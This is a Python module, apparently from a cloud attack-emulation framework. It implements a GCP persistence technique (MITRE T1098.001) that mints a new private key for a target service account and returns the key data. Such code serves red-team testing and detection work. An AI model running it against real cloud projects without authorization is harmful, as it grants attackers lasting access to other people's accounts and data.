from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any, Tuple

from core.gcp.gcp_access import GCPAccess
from google.cloud import iam_admin_v1

@TechniqueRegistry.register
class GCPPersistenceGenerateSAServiceAccountPrivateKey(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.001",
                technique_name="Account Manipulation: Additional Cloud Credentials",
                tactics=["Persistence", "Privilege Escalation"],
            )
        ]

        technique_references = [
            TechniqueReference(ref_title = "GCP Creating Service Account Key Documentation", ref_link = "https://docs.cloud.google.com/iam/docs/keys-create-delete#creating"),
            TechniqueReference(ref_title = "GCP Creating Service Account Key API", ref_link = "https://docs.cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts.keys/create")
        ]

        super().__init__("Generate Service Account Private Key", "Generate a new private key for a Google Cloud Platform service account using the IAM Admin API. This technique allows attackers to create new cryptographic keys for compromised or targeted service accounts, enabling them to authenticate as those accounts and gain access to GCP resources. By generating a new private key, attackers can bypass existing security measures and maintain persistence within the cloud environment. The technique handles API interactions, manages key creation, and formats the output for easy analysis.", mitre_techniques=mitre_techniques, references=technique_references)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            service_account_email: str = kwargs.get('service_account_email')
            
            # Validate service_account_email is not None or empty
            if not service_account_email or service_account_email.strip() == "":
                return ExecutionStatus.FAILURE, {
                    "error": "service_account_email is required",
                    "message": "Service account email must be provided"
                }

            manager = GCPAccess()
            manager.get_current_access()
            credential = manager.credential

            iam_admin_client = iam_admin_v1.IAMClient(credentials=credential)
            name = f"projects/-/serviceAccounts/{service_account_email}"

            response = iam_admin_client.create_service_account_key(
                request={
                    "name": name,
                    "private_key_type": iam_admin_v1.ServiceAccountPrivateKeyType.TYPE_GOOGLE_CREDENTIALS_FILE,
                    "key_algorithm": iam_admin_v1.ServiceAccountKeyAlgorithm.KEY_ALG_RSA_2048
                }
            )

            key_info = {
                "name": response.name,
                "private_key_data": response.private_key_data.decode('utf-8')
            }

            return ExecutionStatus.SUCCESS, {
                "message": "Service account private key generated successfully.",
                "value": key_info
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to generate service account private key: {str(e)}"
            }
        
    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "service_account_email": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Service Account Email",
                "input_field_type": "text",
            },
        } 